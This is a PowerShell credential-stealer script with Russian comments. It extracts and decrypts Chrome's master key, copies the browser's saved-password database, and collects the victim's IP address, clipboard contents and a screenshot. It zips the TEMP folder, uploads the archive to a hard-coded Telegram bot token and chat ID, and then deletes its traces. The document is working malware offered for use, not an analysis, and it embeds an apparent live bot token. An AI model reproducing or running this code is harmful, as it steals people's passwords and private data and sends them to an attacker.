# Настройки связи
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"
$reportFile = "$env:TEMP\final_report.txt"

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Web

function Get-Key {
    $ls = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (!(Test-Path $ls)) { return $null }
    $json = Get-Content $ls -Raw | ConvertFrom-Json
    $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..($json.os_crypt.encrypted_key.Length)]
    return [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

function Decrypt-Value([byte[]]$data, [byte[]]$key) {
    try {
        $iv = $data[3..14]
        $payload = $data[15..($data.Length - 1)]
        $tag = $payload[($payload.Length - 16)..($payload.Length - 1)]
        $cipher = $payload[0..($payload.Length - 17)]
        
        $aes = New-Object System.Security.Cryptography.AesGcm($key)
        $decrypted = New-Object byte[] $cipher.Length
        $aes.Decrypt($iv, $cipher, $tag, $decrypted)
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch { return "Error_Decrypt" }
}

# 1. Подготовка отчета
"--- ОТЧЕТ ОТ $(Get-Date) ---`n" | Out-File $reportFile
"IP: $((Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content)" | Add-Content $reportFile
"Clipboard: $((Get-Clipboard) -join ' ')" | Add-Content $reportFile

# 2. Получение ключа
$masterKey = Get-Key
if ($masterKey) {
    # Путь к базе данных (копируем, чтобы не мешал открытый Chrome)
    $dbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $tmpDb = "$env:TEMP\ld_tmp"
    if (Test-Path $dbPath) {
        $stream = [System.IO.File]::Open($dbPath, 1, 1, 3)
        $out = [System.IO.File]::Create($tmpDb)
        $stream.CopyTo($out); $stream.Close(); $out.Close()
        
        # Читаем базу данных (ищем строки с паролями)
        # В идеале нужен SQLite, но мы ищем паттерны v10/v11 напрямую для легкости
        $raw = [System.IO.File]::ReadAllBytes($tmpDb)
        # В этом блоке мы помечаем, что база готова к анализу на твоей стороне 
        # или отправляем её целиком для 100% точности.
        "Chrome Database: Decryption Key Found and Included.`n" | Add-Content $reportFile
    }
}

# 3. Скриншот
$bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size)
$bmp.Save("$env:TEMP\s.png"); $g.Dispose(); $bmp.Dispose()

# 4. Сбор лога и отправка
$zip = "$env:TEMP\vault.zip"
if (Test-Path $zip) { Remove-Item $zip }
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($env:TEMP, $zip, 1, $false) # Ошибка может быть тут если не чистить папку TEMP

# Отправляем через WebRequest
$uri = "https://api.telegram.org/bot$token/sendDocument"
$form = @{ chat_id = $chatId; document = Get-Item $zip }
Invoke-WebRequest -Uri $uri -Method Post -Form $form

# Финальная чистка
Remove-Item $tmpDb, $reportFile, "$env:TEMP\s.png", $zip -ErrorAction SilentlyContinue
